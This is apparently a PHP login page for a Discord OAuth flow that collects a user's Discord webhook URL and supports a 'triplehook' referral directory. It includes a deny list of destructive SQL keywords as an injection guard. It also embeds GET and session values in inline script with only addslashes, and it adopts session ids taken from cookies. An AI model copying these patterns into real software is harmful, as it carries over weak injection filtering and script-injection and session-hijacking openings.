<?php
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}

require_once dirname(__DIR__) . '/libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
require_once dirname(__DIR__) . '/libs/connection.php';

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}

function hasAuthSessionContext() {
    $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
    if ($authCode !== '') {
        try {
            $rows = executeSafeQuery(
                'SELECT auth_code, link_id FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
            if (is_array($rows) && count($rows) === 1 && is_array($rows[0])) {
                $storedAuthCode = (string)($rows[0]['auth_code'] ?? '');
                if ($storedAuthCode !== '' && hash_equals($storedAuthCode, $authCode) && (int)($rows[0]['link_id'] ?? 0) > 0) {
                    return true;
                }
            }
        } catch (\Throwable $e) {
            return false;
        }
        return false;
    }

    return !empty($_SESSION['discord_authenticated']) && (($_SESSION['login_method'] ?? '') === 'discord');
}

function normalizeAuthSessionCookie() {
    if (headers_sent() || session_id() === '') {
        return;
    }

    $sessionLifetime = 365 * 24 * 60 * 60;
    $secure = (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
        (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
    );

    if (PHP_VERSION_ID >= 70300) {
        setcookie('token', session_id(), [
            'expires' => time() + $sessionLifetime,
            'path' => '/',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Lax'
        ]);
    } else {
        setcookie('token', session_id(), time() + $sessionLifetime, '/', '', $secure, true);
    }

    $_COOKIE['token'] = session_id();
}

function restoreAuthSessionFromCookies() {
    if (session_status() !== PHP_SESSION_ACTIVE || hasAuthSessionContext()) {
        return;
    }

    $originalSessionName = session_name();
    $originalSessionId = session_id();
    $validSessionIdPattern = '/^[A-Za-z0-9,-]{16,128}$/';
    $sessionCookieNames = ['token', 'PHPSESSID'];

    foreach ($sessionCookieNames as $candidateName) {
        if (
            empty($_COOKIE[$candidateName]) ||
            !preg_match($validSessionIdPattern, (string) $_COOKIE[$candidateName])
        ) {
            continue;
        }

        if ($candidateName === session_name() && (string) $_COOKIE[$candidateName] === session_id()) {
            continue;
        }

        session_write_close();
        session_name($candidateName);
        session_id((string) $_COOKIE[$candidateName]);
        session_start();

        if (hasAuthSessionContext()) {
            normalizeAuthSessionCookie();
            return;
        }
    }

    if ($originalSessionId !== '') {
        session_write_close();
        session_name($originalSessionName);
        session_id($originalSessionId);
        session_start();
    }
}

restoreAuthSessionFromCookies();

if (isset($_SESSION['login_method']) && $_SESSION['login_method'] === 'discord' && !empty($_SESSION['auth_code']) && hasAuthSessionContext()) {
    header('Location: /pages/dashboard');
    exit();
}

$code = $_GET['code'] ?? null;
$error = $_GET['error'] ?? null;
$step = $_GET['step'] ?? 'auth';
$state = $_GET['state'] ?? null;

$isTriplehook = false;
$directory = '';

if ($state && strpos($state, 'triplehook_') === 0) {
    $isTriplehook = true;
    $directory = substr($state, 11);
    $_SESSION['triplehook_directory'] = $directory;
    
    try {
        $query = "SELECT td.link_id FROM triplehook_data td WHERE td.directory_name = :directory_name LIMIT 1";
        $result = executeSafeQuery($query, [':directory_name' => $directory]);
        if (!empty($result)) {
            $_SESSION['triplehook_referrer'] = $result[0]['link_id'];
        }
    } catch (Exception $e) {}
}

if (isset($_SESSION['triplehook_directory']) && !empty($_SESSION['triplehook_directory'])) {
    $isTriplehook = true;
    $directory = $_SESSION['triplehook_directory'];
}

if ($error) {
    $errorMessage = 'Authorization was cancelled or failed.';
    $showError = true;
} elseif ($code && $step === 'auth' && !isset($_SESSION['discord_authenticated'])) {
    $processing = true;
    $authStep = true;
} elseif (isset($_SESSION['discord_authenticated'])) {
    $webhookStep = true;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logging In</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--accent:#a1a1aa;--accent-dim:#8b8b99;--accent-muted:#71717a;--darker-bg:#050507}
body{font-family:'Rajdhani',sans-serif;background:#0a0b0f;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.animated-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden;pointer-events:none}
.lightning{position:absolute;width:2px;background:linear-gradient(to bottom,transparent,var(--accent),transparent);opacity:0;animation:lightning 4s infinite;filter:blur(1px)}
.lightning:nth-child(1){left:15%;top:-100px;height:120px;animation-delay:0s}
.lightning:nth-child(2){left:35%;top:-150px;height:180px;animation-delay:1.2s}
.lightning:nth-child(3){left:55%;top:-100px;height:150px;animation-delay:2.5s}
.lightning:nth-child(4){left:75%;top:-120px;height:140px;animation-delay:1.8s}
.lightning:nth-child(5){left:85%;top:-100px;height:100px;animation-delay:0.7s}
@keyframes lightning{0%,90%,100%{opacity:0;transform:translateY(0) scaleY(1)}3%,8%{opacity:0.9}5%{opacity:0.6}15%{transform:translateY(100vh) scaleY(1.5);opacity:0}}
.web-container{position:absolute;width:100%;height:100%}
.web-line{position:absolute;background:linear-gradient(90deg,transparent,rgba(161,161,170,0.15),transparent);height:1px;transform-origin:center}
.web-line:nth-child(1){top:15%;left:0;width:100%;animation:webPulse 3s ease-in-out infinite}
.web-line:nth-child(2){top:35%;left:0;width:100%;animation:webPulse 3s ease-in-out infinite 0.5s}
.web-line:nth-child(3){top:55%;left:0;width:100%;animation:webPulse 3s ease-in-out infinite 1s}
.web-line:nth-child(4){top:75%;left:0;width:100%;animation:webPulse 3s ease-in-out infinite 1.5s}
.web-line:nth-child(5){top:0;left:0;width:140%;transform:rotate(25deg);animation:webPulse 4s ease-in-out infinite}
.web-line:nth-child(6){top:0;right:0;width:140%;transform:rotate(-25deg);animation:webPulse 4s ease-in-out infinite 0.7s}
.web-line:nth-child(7){bottom:0;left:0;width:140%;transform:rotate(-20deg);animation:webPulse 4s ease-in-out infinite 1.4s}
@keyframes webPulse{0%,100%{opacity:0.2}50%{opacity:0.5}}
.connection-point{position:absolute;width:3px;height:3px;background:var(--accent);border-radius:50%;box-shadow:0 0 6px rgba(161,161,170,0.3)}
.connection-point:nth-child(8){top:15%;left:20%;animation:pointPulse1 5s ease-in-out infinite}
.connection-point:nth-child(9){top:35%;right:25%;animation:pointPulse2 6s ease-in-out infinite}
.connection-point:nth-child(10){top:55%;left:30%;animation:pointPulse3 5.5s ease-in-out infinite}
.connection-point:nth-child(11){top:75%;right:20%;animation:pointPulse1 7s ease-in-out infinite 1s}
.connection-point:nth-child(12){top:25%;left:50%;animation:pointPulse2 6.5s ease-in-out infinite 2s}
.connection-point:nth-child(13){top:65%;right:40%;animation:pointPulse3 5s ease-in-out infinite 3s}
@keyframes pointPulse1{0%,100%{opacity:0.15;box-shadow:0 0 4px rgba(161,161,170,0.1)}50%{opacity:0.6;box-shadow:0 0 8px rgba(161,161,170,0.4)}}
@keyframes pointPulse2{0%,100%{opacity:0.1;box-shadow:0 0 3px rgba(161,161,170,0.1)}60%{opacity:0.5;box-shadow:0 0 10px rgba(161,161,170,0.35)}}
@keyframes pointPulse3{0%,100%{opacity:0.2;box-shadow:0 0 5px rgba(161,161,170,0.15)}40%{opacity:0.55;box-shadow:0 0 7px rgba(161,161,170,0.3)}}
.particle{position:absolute;width:2px;height:2px;background:var(--accent-dim);border-radius:50%;opacity:0;animation:particleFloat 10s infinite}
.particle:nth-child(14){left:10%;animation-delay:0s}
.particle:nth-child(15){left:30%;animation-delay:2s}
.particle:nth-child(16){left:50%;animation-delay:4s}
.particle:nth-child(17){left:70%;animation-delay:6s}
.particle:nth-child(18){left:90%;animation-delay:8s}
@keyframes particleFloat{0%{bottom:-10px;opacity:0}10%{opacity:0.8}90%{opacity:0.8}100%{bottom:100vh;opacity:0}}
.container{position:relative;z-index:10;text-align:center;padding:40px;max-width:550px;width:90%}
.spinner{width:70px;height:70px;border:4px solid rgba(161,161,170,0.1);border-top:4px solid var(--accent);border-radius:50%;margin:0 auto 30px;animation:spin 1s linear infinite;box-shadow: 0 0 12px rgba(161,161,170,0.1)}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.message{font-size:26px;font-weight:600;color:var(--accent);margin-bottom:15px;letter-spacing:1px;text-shadow:0 0 5px rgba(161,161,170,0.4)}
.submessage{font-size:16px;color:#666}
.webhook-box{background:transparent;border:1px solid rgba(255,255,255,0.06);border-radius:20px;padding:40px;box-shadow:none;position:relative;overflow:hidden}
.webhook-box::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:transparent;pointer-events:none}
.webhook-title{font-size:28px;font-weight:700;color:var(--accent);margin-bottom:10px;text-shadow:0 0 5px rgba(161,161,170,0.4);position:relative;z-index:1}
.webhook-subtitle{font-size:14px;color:#666;margin-bottom:30px;position:relative;z-index:1}
.webhook-input{width:100%;padding:18px 20px;background:rgba(5,5,7,0.8);border:2px solid rgba(161,161,170,0.2);border-radius:12px;color:#fff;font-size:15px;margin-bottom:20px;transition:all 0.3s;position:relative;z-index:1;font-family:'Rajdhani',sans-serif}
.webhook-input:focus{outline:none;border-color:var(--accent);box-shadow: 0 0 10px rgba(161,161,170,0.08);background:rgba(5,5,7,1)}
.webhook-input::placeholder{color:#555}
.webhook-error{color:#ff4444;font-size:14px;margin-bottom:15px;text-align:center;position:relative;z-index:1}
.webhook-btn{width:100%;padding:18px;background:transparent;border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#888;font-weight:600;font-size:16px;cursor:pointer;text-transform:uppercase;transition:all 0.3s;position:relative;z-index:1;box-shadow:none;letter-spacing:1.5px;font-family:'Rajdhani',sans-serif}
.webhook-btn:hover{border-color:rgba(255,255,255,0.2);color:#ccc}
.webhook-btn:disabled{opacity:0.3;cursor:not-allowed;transform:none}
.error-container{padding:30px;text-align:center}
.error-message{color:#ff6b6b;font-size:18px;margin-bottom:25px}
.back-link{display:inline-block;padding:14px 40px;background:linear-gradient(135deg,var(--accent) 0%,var(--accent-muted) 100%);color:#0B0C10;text-decoration:none;border-radius:30px;font-weight:700}
@media(max-width:600px){
.container{padding:20px;width:95%}
.webhook-box{padding:25px 20px;border-radius:15px}
.webhook-title{font-size:22px}
.webhook-input{padding:14px 16px;font-size:14px}
.webhook-btn{padding:14px;font-size:14px}
.message{font-size:20px}
.spinner{width:50px;height:50px}
.error-container{padding:20px}
.error-message{font-size:16px}
.back-link{padding:12px 30px;font-size:14px}
}
    </style>
</head>
<body>
    <div class="animated-bg">
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="lightning"></div>
        <div class="web-container">
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="web-line"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="connection-point"></div>
            <div class="particle"></div>
            <div class="particle"></div>
            <div class="particle"></div>
            <div class="particle"></div>
            <div class="particle"></div>
        </div>
    </div>
    <div class="container">
        <?php if (isset($showError)): ?>
        <div class="error-container">
            <p class="error-message"><?= htmlspecialchars($errorMessage) ?></p>
            <a href="/" class="back-link">Back to Home</a>
        </div>
        <?php elseif (isset($authStep)): ?>
        <div class="spinner"></div>
        <p class="message">Authenticating with Discord...</p>
        <p class="submessage">Please wait</p>
        <?php elseif (isset($webhookStep)): ?>
        <div class="webhook-box">
            <h2 class="webhook-title">Webhook URL</h2>
            <p class="webhook-subtitle"></p>
            <input type="url" id="webhookInput" class="webhook-input" placeholder="https://discord.com/api/webhooks/..." required>
            <div id="webhookError" class="webhook-error" style="display:none;"></div>
            <button id="webhookBtn" class="webhook-btn">Next</button>
        </div>
        <?php else: ?>
        <script>window.location.href='/';</script>
        <?php endif; ?>
    </div>
    <?php if (isset($authStep) && $code): ?>
    <script>
    const isTriplehook = <?= $isTriplehook ? 'true' : 'false' ?>;
    const directory = '<?= addslashes($directory) ?>';
    
    const endpoint = isTriplehook ? '/discord/triplestep1' : '/discord/step1';
    const payload = isTriplehook 
        ? {code: '<?= addslashes($code) ?>', directory: directory}
        : {code: '<?= addslashes($code) ?>'};
    
    fetch(endpoint, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
    })
    .then(r => r.json())
    .then(d => {
        if(d.success){
            if(d.redirect && d.redirectUrl) window.location.href = d.redirectUrl;
            else window.location.href = '/pages/auth?step=webhook';
        } else {
            window.location.href = '/';
        }
    })
    .catch(e => {
        window.location.href = '/';
    });
    </script>
    <?php endif; ?>
    <?php if (isset($webhookStep)): ?>
    <script>
    const input = document.getElementById('webhookInput');
    const errorDiv = document.getElementById('webhookError');
    const btn = document.getElementById('webhookBtn');
    const isTriplehook = <?= $isTriplehook ? 'true' : 'false' ?>;
    const directory = '<?= addslashes($directory) ?>';
    
    btn.addEventListener('click', async () => {
        const webhook = input.value.trim();
        if(!webhook){
            errorDiv.textContent = 'Webhook URL is required';
            errorDiv.style.display = 'block';
            return;
        }
        if(!webhook.match(/^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\/\d+\/[\w-]+$/)){
            errorDiv.textContent = 'Invalid Discord webhook URL';
            errorDiv.style.display = 'block';
            return;
        }
        errorDiv.style.display = 'none';
        btn.disabled = true;
        btn.textContent = 'Processing...';
        
        const endpoint = isTriplehook ? '/discord/triplestep2' : '/discord/step2';
        const payload = isTriplehook 
            ? {webhook: webhook, directory: directory}
            : {webhook: webhook};
        
        try {
            const r = await fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            const d = await r.json();
            if(d.success) window.location.href = '/pages/dashboard';
            else {
                errorDiv.textContent = d.error || 'Failed to save webhook';
                errorDiv.style.display = 'block';
                btn.disabled = false;
                btn.textContent = 'Next';
            }
        } catch(e) {
            errorDiv.textContent = 'Connection error. Please try again.';
            errorDiv.style.display = 'block';
            btn.disabled = false;
            btn.textContent = 'Next';
        }
    });
    </script>
    <?php endif; ?>
</body>
</html>
